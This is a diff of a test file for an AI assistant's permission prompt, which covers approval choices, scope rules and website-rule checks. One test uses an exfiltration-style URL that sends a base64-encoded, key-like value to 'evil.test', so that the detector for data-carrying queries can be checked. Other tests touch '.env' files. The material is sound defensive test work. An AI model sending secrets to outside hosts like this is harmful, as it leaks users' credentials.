@@ -5,7 +5,12 @@ import { PermissionRequestEvent, Settings } from '../core/models';
 import { FALLBACK_SETTINGS, SettingsService } from '../core/settings.service';
 import { WorkspaceService } from '../core/workspace.service';
 import { CopyButton } from './copy-button';
-import { PermissionOverlay } from './permission-overlay';
+import {
+  PermissionOverlay,
+  queryLooksLikeData,
+  websiteRuleCovers,
+  websiteRuleFits,
+} from './permission-overlay';
 
 @Pipe({ name: 'transloco', standalone: true })
 class StubTranslocoPipe implements PipeTransform {
@@ -25,18 +30,38 @@ function request(patch: Partial<PermissionRequestEvent> = {}): PermissionRequest
     kind: 'permissionRequest',
     requestId: 'req-1',
     promptKind: 'command',
-    title: 'Title',
-    detail: 'Detail',
-    command: 'ls',
+    title: 'Run command?',
+    detail: "Command 'ls' requires approval",
+    command: 'ls -la src',
     path: null,
     folder: null,
     url: null,
-    suggestedRule: 'ls',
+    suggestedRule: 'ls -la src',
     segments: [],
     risk: null,
-    scopeOptions: [],
+    scopeOptions: [
+      { kind: 'program', rule: { kind: 'glob', value: 'ls *' } },
+      { kind: 'programFlags', rule: { kind: 'glob', value: 'ls -la *' } },
+      { kind: 'exact', rule: { kind: 'exact', value: 'ls -la src' } },
+    ],
+    folders: [],
+    hosts: [],
+    justification: null,
     ...patch,
   };
+}
+
+function webRequest(patch: Partial<PermissionRequestEvent> = {}): PermissionRequestEvent {
+  return request({
+    promptKind: 'web',
+    title: 'Visit docs.example.com?',
+    detail: 'The assistant wants to visit docs.example.com.',
+    command: null,
+    url: 'https://docs.example.com/page',
+    suggestedRule: 'docs.example.com',
+    scopeOptions: [],
+    ...patch,
+  });
 }
 
 describe('PermissionOverlay', () => {
@@ -44,7 +69,7 @@ describe('PermissionOverlay', () => {
   let resolvePermission: ReturnType<typeof vi.fn>;
   let settingsValue: ReturnType<typeof signal<Settings>>;
 
-  function create(req: PermissionRequestEvent, patch: Partial<Settings> = {}): void {
+  async function create(req: PermissionRequestEvent, patch: Partial<Settings> = {}) {
     resolvePermission = vi.fn().mockResolvedValue(undefined);
     settingsValue = signal<Settings>({ ...FALLBACK_SETTINGS, ...patch });
     TestBed.configureTestingModule({
@@ -66,264 +91,507 @@ describe('PermissionOverlay', () => {
     fixture = TestBed.createComponent(PermissionOverlay);
     fixture.componentRef.setInput('request', req);
     fixture.detectChanges();
+    await fixture.whenStable();
+    fixture.detectChanges();
   }
 
-  function buttons(): HTMLButtonElement[] {
-    return [...fixture.nativeElement.querySelectorAll('button')] as HTMLButtonElement[];
+  function element(): HTMLElement {
+    return fixture.nativeElement as HTMLElement;
   }
 
-  it('focuses the allow button by default', async () => {
-    create(request());
-    await fixture.whenStable();
-    fixture.detectChanges();
-    const allow = buttons().find((b) => b.textContent?.includes('permission.allowOnce'));
-    expect(allow).toBeTruthy();
-    expect(document.activeElement).toBe(allow);
-  });
+  function option(id: string): HTMLButtonElement | null {
+    return element().querySelector(`[data-action="${id}"]`);
+  }
 
-  it('moves the active button with arrow keys', async () => {
-    create(request());
-    await fixture.whenStable();
-    fixture.detectChanges();
-    const event = new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true });
-    document.activeElement?.dispatchEvent(event);
-    fixture.detectChanges();
-    document.activeElement?.dispatchEvent(event);
-    fixture.detectChanges();
-    expect(document.activeElement?.textContent).toContain('permission.allowAlways');
-  });
-
-  it('resolves allow_once on Enter', async () => {
-    create(request());
-    await fixture.whenStable();
-    fixture.detectChanges();
-    document.activeElement?.dispatchEvent(
-      new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }),
+  function optionIds(): string[] {
+    return [...element().querySelectorAll('[data-action]')].map(
+      (button) => button.getAttribute('data-action') ?? '',
     );
-    fixture.detectChanges();
-    expect(resolvePermission).toHaveBeenCalledWith('allow_once');
-  });
+  }
 
-  it('marks auto-allowed and pending segments for a compound command', () => {
-    create(
-      request({
-        command: 'echo "hello pipe" | tr \'a-z\' \'A-Z\' && echo "and-this-ran"',
-        segments: [
-          { text: 'echo "hello pipe" ', allowed: true },
-          { text: " tr 'a-z' 'A-Z' ", allowed: false },
-          { text: ' echo "and-this-ran"', allowed: true },
-        ],
-      }),
+  function chips(id: string): string[] {
+    return [...(option(id)?.querySelectorAll('code') ?? [])].map(
+      (code) => code.textContent?.trim() ?? '',
     );
-    const pre = fixture.nativeElement.querySelector('pre') as HTMLElement;
-    const spans = [...pre.querySelectorAll('span')] as HTMLElement[];
-    const pending = spans.filter((span) => span.className.includes('text-accent'));
-    expect(pending.map((span) => span.textContent)).toEqual([" tr 'a-z' 'A-Z' "]);
-    expect(fixture.nativeElement.textContent).toContain('permission.segment.allowed');
-    expect(fixture.nativeElement.textContent).toContain('permission.segment.needsApproval');
-  });
+  }
 
-  it('renders the plain command block without a legend when segments are absent', () => {
-    create(request({ command: 'pnpm build', segments: [] }));
-    const spans = fixture.nativeElement.querySelectorAll('pre span');
-    expect(spans.length).toBe(0);
-    expect(fixture.nativeElement.textContent).not.toContain('permission.segment.allowed');
-  });
-
-  it('passes the selected scope to allow-always', async () => {
-    create(
-      request({
-        command: 'ls -la /test',
-        scopeOptions: [
-          { kind: 'program', rule: { kind: 'glob', value: 'ls *' } },
-          { kind: 'programFlags', rule: { kind: 'glob', value: 'ls -la *' } },
-          { kind: 'exact', rule: { kind: 'exact', value: 'ls -la /test' } },
-        ],
-      }),
-    );
-    await fixture.whenStable();
+  function press(key: string, target: EventTarget | null = document.activeElement): void {
+    (target ?? document.body).dispatchEvent(new KeyboardEvent('keydown', { key, bubbles: true }));
     fixture.detectChanges();
-    const buttons = [...fixture.nativeElement.querySelectorAll('button')] as HTMLButtonElement[];
-    buttons.find((button) => button.textContent?.includes('ls -la /test'))?.click();
+  }
+
+  function openCustomize(): void {
+    (element().querySelector('[data-testid="customize"]') as HTMLButtonElement).click();
     fixture.detectChanges();
-    buttons.find((button) => button.textContent?.includes('permission.allowAlways'))?.click();
-    expect(resolvePermission).toHaveBeenCalledWith('allow_always', [
-      { kind: 'exact', value: 'ls -la /test' },
-    ]);
+  }
+
+  function customizeButton(text: string): HTMLButtonElement {
+    return [...element().querySelectorAll('[data-testid="customize-panel"] button')].find(
+      (button) => button.textContent?.includes(text),
+    ) as HTMLButtonElement;
+  }
+
+  describe('choices', () => {
+    it('offers yes, remembering, no and always deny as a numbered list', async () => {
+      await create(request());
+      expect(optionIds()).toEqual(['allow', 'allow_session', 'allow_always', 'deny', 'deny_always']);
+      expect(option('allow_session')?.textContent).toContain('permission.option.chat');
+      expect(option('allow')?.textContent).toContain('1');
+      expect(chips('allow_session')).toEqual(['ls *']);
+      expect(chips('allow_always')).toEqual(['ls *']);
+      expect(chips('deny_always')).toEqual(['ls *']);
+    });
+
+    it('remembers a subcommand rather than the whole tool by default', async () => {
+      await create(
+        request({
+          command: 'git push origin main',
+          scopeOptions: [
+            { kind: 'program', rule: { kind: 'glob', value: 'git *' } },
+            { kind: 'subcommand', rule: { kind: 'glob', value: 'git push *' } },
+            { kind: 'exact', rule: { kind: 'exact', value: 'git push origin main' } },
+          ],
+        }),
+      );
+      expect(chips('allow_session')).toEqual(['git push *']);
+    });
+
+    it('offers only yes and no when nothing can be remembered', async () => {
+      await create(request({ scopeOptions: [], suggestedRule: null }));
+      expect(optionIds()).toEqual(['allow', 'deny']);
+      expect(element().querySelector('[data-testid="customize"]')).toBeNull();
+    });
+
+    it('offers to always deny the exact line when a command has no scopes', async () => {
+      await create(request({ command: 'sudo ls', scopeOptions: [], suggestedRule: 'sudo ls' }));
+      expect(optionIds()).toEqual(['allow', 'deny', 'deny_always']);
+      expect(chips('deny_always')).toEqual(['sudo ls']);
+    });
+
+    it('shows why the prompt asks without a legend', async () => {
+      await create(request());
+      expect(element().querySelector('[data-testid="reasons"]')?.textContent).toContain(
+        "Command 'ls' requires approval",
+      );
+      expect(element().textContent).not.toContain('permission.segment');
+    });
+
+    it("shows the assistant's own reason when it gave one", async () => {
+      await create(request({ justification: '  Run the tests to verify the fix. ' }));
+      const justification = element().querySelector('[data-testid="justification"]');
+      expect(justification?.textContent).toContain('permission.justification');
+      expect(justification?.textContent).toContain('Run the tests to verify the fix.');
+    });
+
+    it('omits the reason line when the assistant gave none', async () => {
+      await create(request({ justification: '   ' }));
+      expect(element().querySelector('[data-testid="justification"]')).toBeNull();
+    });
+
+    it('explains every choice in a tooltip', async () => {
+      await create(request());
+      expect(
+        [...element().querySelectorAll('[data-action]')].map((button) =>
+          button.getAttribute('title'),
+        ),
+      ).toEqual([
+        'permission.tooltip.allowOnce',
+        'permission.tooltip.allowChat',
+        'permission.tooltip.allowAlways',
+        'permission.tooltip.deny',
+        'permission.tooltip.denyAlways',
+      ]);
+    });
+
+    it('shows a risk chip with the impact detail', async () => {
+      await create(request({ risk: { level: 'high', detail: 'It deletes files.' } }));
+      expect(element().textContent).toContain('permission.risk.high');
+      expect(element().textContent).toContain('It deletes files.');
+    });
   });
 
-  it('offers one scope picker per asking segment and grants them separately', async () => {
-    create(
+  describe('default focus', () => {
+    it("focuses don't ask again when that is the command default", async () => {
+      await create(request());
+      expect(document.activeElement).toBe(option('allow_session'));
+    });
+
+    it('focuses yes when the command default is once', async () => {
+      await create(request(), {
+        permissionDefaults: { website: 'once', command: 'once', folder: 'once' },
+      });
+      expect(document.activeElement).toBe(option('allow'));
+    });
+
+    it('never focuses a remembering choice on a high-risk prompt', async () => {
+      await create(request({ risk: { level: 'danger', detail: 'x' } }));
+      expect(document.activeElement).toBe(option('allow'));
+    });
+  });
+
+  describe('keyboard', () => {
+    it('confirms the focused choice with Enter', async () => {
+      await create(request());
+      press('Enter');
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_session',
+        [{ kind: 'glob', value: 'ls *' }],
+        [],
+        [],
+      );
+    });
+
+    it('picks a choice by its number', async () => {
+      await create(request());
+      press('3');
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_always',
+        [{ kind: 'glob', value: 'ls *' }],
+        [],
+        [],
+      );
+    });
+
+    it('moves between choices with the arrow keys', async () => {
+      await create(request());
+      press('ArrowDown');
+      expect(document.activeElement).toBe(option('allow_always'));
+      press('ArrowUp');
+      press('ArrowUp');
+      expect(document.activeElement).toBe(option('allow'));
+    });
+
+    it('denies with Esc while the prompt has focus', async () => {
+      await create(request());
+      press('Escape');
+      expect(resolvePermission).toHaveBeenCalledWith('deny');
+    });
+
+    it('leaves Esc alone when another panel has focus', async () => {
+      await create(request());
+      const other = document.createElement('button');
+      document.body.appendChild(other);
+      other.focus();
+      press('Escape', other);
+      expect(resolvePermission).not.toHaveBeenCalled();
+      other.remove();
+    });
+
+    it('never treats typing in a field as a choice', async () => {
+      await create(webRequest());
+      openCustomize();
+      const field = element().querySelector('input') as HTMLInputElement;
+      press('2', field);
+      press('Enter', field);
+      expect(resolvePermission).not.toHaveBeenCalled();
+    });
+  });
+
+  describe('customize', () => {
+    it('is hidden when there is nothing to choose', async () => {
+      await create(
+        request({ scopeOptions: [{ kind: 'exact', rule: { kind: 'exact', value: 'ls -la src' } }] }),
+      );
+      expect(element().querySelector('[data-testid="customize"]')).toBeNull();
+      expect(chips('allow_always')).toEqual(['ls -la src']);
+    });
+
+    it('lets the user remember a different scope', async () => {
+      await create(request());
+      openCustomize();
+      customizeButton('ls -la src').click();
+      fixture.detectChanges();
+      expect(chips('allow_always')).toEqual(['ls -la src']);
+      option('allow_always')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_always',
+        [{ kind: 'exact', value: 'ls -la src' }],
+        [],
+        [],
+      );
+    });
+
+    it('selects inside customize with Enter instead of confirming', async () => {
+      await create(request());
+      openCustomize();
+      const exact = customizeButton('ls -la src');
+      exact.focus();
+      press('Enter', exact);
+      expect(resolvePermission).not.toHaveBeenCalled();
+    });
+  });
+
+  describe('compound commands', () => {
+    const compound = () =>
       request({
-        command: "pnpm --version | tr -d '\\n'",
+        command: 'pnpm test && git push origin main',
         segments: [
           {
-            text: 'pnpm --version ',
+            text: 'pnpm test',
             allowed: false,
-            suggestedRule: 'pnpm --version',
+            reason: "Command 'pnpm' requires approval",
             scopeOptions: [
               { kind: 'program', rule: { kind: 'glob', value: 'pnpm *' } },
-              { kind: 'exact', rule: { kind: 'exact', value: 'pnpm --version' } },
+              { kind: 'subcommand', rule: { kind: 'glob', value: 'pnpm test *' } },
+              { kind: 'exact', rule: { kind: 'exact', value: 'pnpm test' } },
             ],
           },
           {
-            text: " tr -d '\\n'",
+            text: 'git push origin main',
             allowed: false,
-            suggestedRule: "tr -d '\\n'",
-            scopeOptions: [
-              { kind: 'program', rule: { kind: 'glob', value: 'tr *' } },
-              { kind: 'exact', rule: { kind: 'exact', value: "tr -d '\\n'" } },
-            ],
+            reason: 'Command contacts websites that are not allowed yet: github.com',
+            scopeOptions: [],
+            hosts: ['github.com'],
           },
         ],
-      }),
-    );
-    await fixture.whenStable();
-    fixture.detectChanges();
-    const buttons = [...fixture.nativeElement.querySelectorAll('button')] as HTMLButtonElement[];
-    buttons.find((button) => button.textContent?.includes('pnpm *'))?.click();
-    buttons.find((button) => button.textContent?.includes('tr *'))?.click();
-    fixture.detectChanges();
-    buttons.find((button) => button.textContent?.includes('permission.allowAlways'))?.click();
-    expect(resolvePermission).toHaveBeenCalledWith('allow_always', [
-      { kind: 'glob', value: 'pnpm *' },
-      { kind: 'glob', value: 'tr *' },
-    ]);
-  });
-
-  it('offers allow-in-this-chat for command prompts', () => {
-    create(
-      request({
-        command: 'tr a b',
-        scopeOptions: [{ kind: 'program', rule: { kind: 'glob', value: 'tr *' } }],
-      }),
-    );
-    const labels = [...fixture.nativeElement.querySelectorAll('button')].map(
-      (button) => (button as HTMLButtonElement).textContent,
-    );
-    expect(labels.some((text) => text?.includes('permission.allowChat'))).toBe(true);
-  });
-
-  it.each([
-    ['permission.allowAlways', 'allow_always'],
-    ['permission.allowChat', 'allow_session'],
-    ['permission.denyAlways', 'deny_always'],
-  ])('preserves matching kind for identical scope values via %s', (label, decision) => {
-    create(
-      request({
-        command: 'tool *',
         scopeOptions: [
-          { kind: 'program', rule: { kind: 'glob', value: 'tool *' } },
-          { kind: 'exact', rule: { kind: 'exact', value: 'tool *' } },
+          { kind: 'program', rule: { kind: 'glob', value: 'pnpm *' } },
+          { kind: 'subcommand', rule: { kind: 'glob', value: 'pnpm test *' } },
+          { kind: 'exact', rule: { kind: 'exact', value: 'pnpm test' } },
         ],
-      }),
-    );
-    const scopes = buttons().filter((button) => button.querySelector('code'));
-    expect(scopes).toHaveLength(2);
-    expect(scopes.map((button) => button.querySelector('code')?.textContent?.trim())).toEqual([
-      'tool *',
-      'tool *',
-    ]);
-    expect(scopes[0].className).not.toContain('border-accent/60');
-    expect(scopes[1].className).toContain('border-accent/60');
+        hosts: ['github.com'],
+      });
 
-    const action = buttons().find((button) => button.textContent?.includes(label))!;
-    action.click();
-    expect(resolvePermission).toHaveBeenLastCalledWith(decision, [
-      { kind: 'exact', value: 'tool *' },
-    ]);
+    it('lists each reason once and highlights the asking parts', async () => {
+      await create(compound());
+      const reasons = element().querySelectorAll('[data-testid="reasons"] li');
+      expect([...reasons].map((item) => item.textContent?.trim())).toEqual([
+        "Command 'pnpm' requires approval",
+        'Command contacts websites that are not allowed yet: github.com',
+      ]);
+      const pending = element().querySelectorAll('[data-testid="command"] span.text-accent');
+      expect([...pending].map((part) => part.textContent)).toEqual([
+        'pnpm test',
+        'git push origin main',
+      ]);
+    });
 
-    scopes[0].click();
-    fixture.detectChanges();
-    expect(scopes[0].className).toContain('border-accent/60');
-    expect(scopes[1].className).not.toContain('border-accent/60');
-    action.click();
-    expect(resolvePermission).toHaveBeenLastCalledWith(decision, [
-      { kind: 'glob', value: 'tool *' },
-    ]);
+    it('remembers every part in one choice', async () => {
+      await create(compound());
+      expect(chips('allow_session')).toEqual(['pnpm test *', 'github.com']);
+      option('allow_session')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_session',
+        [{ kind: 'glob', value: 'pnpm test *' }],
+        [],
+        ['github.com'],
+      );
+    });
 
-    scopes[1].click();
-    fixture.detectChanges();
-    action.click();
-    expect(resolvePermission).toHaveBeenLastCalledWith(decision, [
-      { kind: 'exact', value: 'tool *' },
-    ]);
-  });
+    it('offers a rule picker only for parts with a choice', async () => {
+      await create(compound());
+      openCustomize();
+      const parts = element().querySelectorAll('[data-testid="asking-segment"]');
+      expect(parts).toHaveLength(1);
+      expect(parts[0].textContent).toContain('pnpm test');
+    });
 
-  it('compares selected rules structurally rather than by object identity', () => {
-    create(
-      request({
-        scopeOptions: [{ kind: 'exact', rule: { kind: 'exact', value: 'tool *' } }],
-      }),
-    );
-    fixture.componentInstance['selectedScopeRule'].set({ value: 'tool *', kind: 'exact' });
-    fixture.detectChanges();
-    expect(buttons().find((button) => button.querySelector('code'))?.className).toContain(
-      'border-accent/60',
-    );
-  });
-
-  it('keeps exact and glob rules with identical values distinct across compound segments', () => {
-    create(
-      request({
-        command: 'tool * && tool *',
-        segments: ['tool * ', ' tool *'].map((text) => ({
-          text,
-          allowed: false,
-          scopeOptions: [
-            { kind: 'program', rule: { kind: 'glob', value: 'tool *' } },
-            { kind: 'exact', rule: { kind: 'exact', value: 'tool *' } },
+    it('matches parts even when the line had comments', async () => {
+      await create(
+        request({
+          command: 'ls src # list\nkill 42',
+          segments: [
+            { text: 'ls src', allowed: true },
+            {
+              text: 'kill 42',
+              allowed: false,
+              reason: "'kill' stops running processes",
+              scopeOptions: [{ kind: 'program', rule: { kind: 'glob', value: 'kill *' } }],
+            },
           ],
-        })),
-      }),
-    );
-    const scopes = buttons().filter((button) => button.querySelector('code'));
-    expect(scopes).toHaveLength(4);
-    expect(scopes.map((button) => button.className.includes('border-accent/60'))).toEqual([
-      false,
-      true,
-      false,
-      true,
-    ]);
-    scopes[0].click();
-    fixture.detectChanges();
-    expect(scopes.map((button) => button.className.includes('border-accent/60'))).toEqual([
-      true,
-      false,
-      false,
-      true,
-    ]);
-    buttons()
-      .find((button) => button.textContent?.includes('permission.allowAlways'))!
-      .click();
-    expect(resolvePermission).toHaveBeenCalledWith('allow_always', [
-      { kind: 'glob', value: 'tool *' },
-      { kind: 'exact', value: 'tool *' },
-    ]);
+          scopeOptions: [{ kind: 'program', rule: { kind: 'glob', value: 'kill *' } }],
+        }),
+      );
+      const pending = element().querySelectorAll('[data-testid="command"] span.text-accent');
+      expect([...pending].map((part) => part.textContent)).toEqual(['kill 42']);
+    });
   });
 
-  it('does not use a suggested command string when typed scopes are absent', () => {
-    create(request({ suggestedRule: 'tool *' }));
-    buttons()
-      .find((button) => button.textContent?.includes('permission.allowAlways'))!
-      .click();
-    expect(resolvePermission).toHaveBeenCalledWith('allow_always', []);
+  describe('folders and websites of a command', () => {
+    it('remembers the most specific outside folder', async () => {
+      await create(
+        request({
+          command: 'cat /other/repo/a.txt',
+          scopeOptions: [],
+          folders: ['/other/repo', '/other'],
+        }),
+      );
+      expect(chips('allow_session')).toEqual(['/other/repo']);
+      option('allow_session')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith('allow_session', [], ['/other/repo'], []);
+    });
+
+    it('shortens folders below the home directory for display only', async () => {
+      await create(
+        request({ command: 'ls /Users/me/repo', scopeOptions: [], folders: ['/Users/me/repo'] }),
+      );
+      fixture.componentInstance['home'].set('/Users/me');
+      fixture.detectChanges();
+      expect(chips('allow_always')).toEqual(['~/repo']);
+      option('allow_always')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith('allow_always', [], ['/Users/me/repo'], []);
+    });
+
+    it('remembers unknown hosts and lets the user drop them', async () => {
+      await create(
+        request({
+          command: 'curl https://api.x.test/v1',
+          suggestedRule: 'curl https://api.x.test/v1',
+          scopeOptions: [],
+          hosts: ['api.x.test'],
+          risk: { level: 'network', detail: 'It connects to api.x.test.' },
+        }),
+      );
+      expect(element().textContent).toContain('permission.risk.network');
+      expect(chips('allow_always')).toEqual(['api.x.test']);
+      openCustomize();
+      (element().querySelector('[data-testid="host-option"]') as HTMLButtonElement).click();
+      fixture.detectChanges();
+      // Nothing left to remember: only yes, no and always deny remain.
+      expect(optionIds()).toEqual(['allow', 'deny', 'deny_always']);
+    });
   });
 
-  it('shows a risk chip with the impact detail on hover', () => {
-    create(
-      request({
-        command: 'cat .env',
-        risk: { level: 'danger', detail: 'It touches sensitive files.' },
-      }),
-    );
-    const chip = fixture.nativeElement.querySelector('[tabindex="0"]') as HTMLElement | null;
-    expect(chip?.textContent).toContain('permission.risk.danger');
-    expect(fixture.nativeElement.textContent).toContain('It touches sensitive files.');
+  describe('website prompts', () => {
+    it('offers the same numbered choices', async () => {
+      await create(webRequest());
+      expect(optionIds()).toEqual(['allow', 'allow_session', 'allow_always', 'deny', 'deny_always']);
+      expect(option('allow_session')?.textContent).toContain('permission.option.session');
+      expect(chips('allow_always')).toEqual(['docs.example.com']);
+      option('allow_session')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_session',
+        undefined,
+        undefined,
+        undefined,
+        'docs.example.com',
+      );
+    });
+
+    it('saves an edited rule that still covers the host', async () => {
+      await create(webRequest());
+      openCustomize();
+      const field = element().querySelector('input') as HTMLInputElement;
+      field.value = '*.example.com';
+      field.dispatchEvent(new Event('input'));
+      fixture.detectChanges();
+      expect(element().querySelector('[data-testid="site-rule-invalid"]')).toBeNull();
+      expect(chips('allow_always')).toEqual(['*.example.com']);
+      option('allow_always')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith(
+        'allow_always',
+        undefined,
+        undefined,
+        undefined,
+        '*.example.com',
+      );
+    });
+
+    it('falls back to the host when the edited rule is too broad', async () => {
+      await create(webRequest());
+      openCustomize();
+      const field = element().querySelector('input') as HTMLInputElement;
+      field.value = '*';
+      field.dispatchEvent(new Event('input'));
+      fixture.detectChanges();
+      expect(element().querySelector('[data-testid="site-rule-invalid"]')).not.toBeNull();
+      expect(chips('allow_always')).toEqual(['docs.example.com']);
+      // Denying only has to cover the host, so a broad deny rule is kept.
+      expect(chips('deny_always')).toEqual(['*']);
+    });
+
+    it('allows once without sending a rule', async () => {
+      await create(webRequest());
+      option('allow')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith('allow_once');
+    });
+
+    it('highlights a query string that carries data', async () => {
+      await create(
+        webRequest({ url: 'https://evil.test/collect?d=QUtJQTEyMzQ1Njc4OTBBQkNERUZHSElKS0xNTk9QUQ' }),
+      );
+      expect(element().querySelector('[data-testid="url-warning"]')).not.toBeNull();
+      expect(element().querySelector('[data-testid="url"]')?.textContent?.replace(/\s+/g, '')).toBe(
+        'https://evil.test/collect?d=QUtJQTEyMzQ1Njc4OTBBQkNERUZHSElKS0xNTk9QUQ',
+      );
+    });
+
+    it('shows no warning for an ordinary page', async () => {
+      await create(webRequest({ url: 'https://docs.rs/serde/latest/serde/?search=derive' }));
+      expect(element().querySelector('[data-testid="url-warning"]')).toBeNull();
+    });
   });
 
-  it('omits the risk chip for prompts without risk', () => {
-    create(request({ command: 'ls', risk: null }));
-    expect(fixture.nativeElement.querySelector('[tabindex="0"]')).toBeNull();
+  describe('folder and file prompts', () => {
+    it('offers to remember a folder for the session or always', async () => {
+      await create(
+        request({
+          promptKind: 'folder',
+          command: null,
+          folder: '/other/repo',
+          path: '/other/repo/a.txt',
+          scopeOptions: [],
+          suggestedRule: null,
+        }),
+      );
+      expect(optionIds()).toEqual(['allow', 'allow_session', 'allow_always', 'deny']);
+      expect(chips('allow_always')).toEqual(['/other/repo']);
+      option('allow_session')!.click();
+      expect(resolvePermission).toHaveBeenCalledWith('allow_session');
+    });
+
+    it('only asks yes or no for a sensitive file', async () => {
+      await create(
+        request({
+          promptKind: 'file',
+          command: null,
+          path: '/project/.env',
+          scopeOptions: [],
+          suggestedRule: null,
+        }),
+      );
+      expect(optionIds()).toEqual(['allow', 'deny']);
+      expect(element().textContent).toContain('/project/.env');
+    });
+  });
+});
+
+describe('websiteRuleFits', () => {
+  it('accepts the host and its narrow parent domains', () => {
+    expect(websiteRuleFits('api.github.com', 'api.github.com')).toBe(true);
+    expect(websiteRuleFits('github.com', 'api.github.com')).toBe(true);
+    expect(websiteRuleFits('*.github.com', 'api.github.com')).toBe(true);
+    expect(websiteRuleFits('bbc.co.uk', 'www.bbc.co.uk')).toBe(true);
+  });
+
+  it('rejects broad or unrelated rules', () => {
+    for (const rule of ['*', '*.com', 'com', '*.co.uk', 'docs.*', 'evil.com', '']) {
+      expect(websiteRuleFits(rule, 'api.github.com')).toBe(false);
+    }
+  });
+});
+
+describe('websiteRuleCovers', () => {
+  it('matches globs and plain domains with their subdomains', () => {
+    expect(websiteRuleCovers('*', 'tracker.com')).toBe(true);
+    expect(websiteRuleCovers('*.com', 'tracker.com')).toBe(true);
+    expect(websiteRuleCovers('tracker.com', 'cdn.tracker.com')).toBe(true);
+    expect(websiteRuleCovers('docs.*', 'docs.rs')).toBe(true);
+    expect(websiteRuleCovers('evil.com', 'tracker.com')).toBe(false);
+    expect(websiteRuleCovers('tracker.com', 'nottracker.com')).toBe(false);
+  });
+});
+
+describe('queryLooksLikeData', () => {
+  it('flags long queries and encoded blobs', () => {
+    expect(queryLooksLikeData('?q=' + 'a'.repeat(200))).toBe(true);
+    expect(queryLooksLikeData('?token=ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlK')).toBe(true);
+    expect(queryLooksLikeData('?k=0123456789abcdef0123456789abcdef')).toBe(true);
+  });
+
+  it('accepts ordinary queries', () => {
+    expect(queryLooksLikeData('')).toBe(false);
+    expect(queryLooksLikeData('?q=angular+signals&page=2')).toBe(false);
+    expect(queryLooksLikeData('?search=derive')).toBe(false);
   });
 });
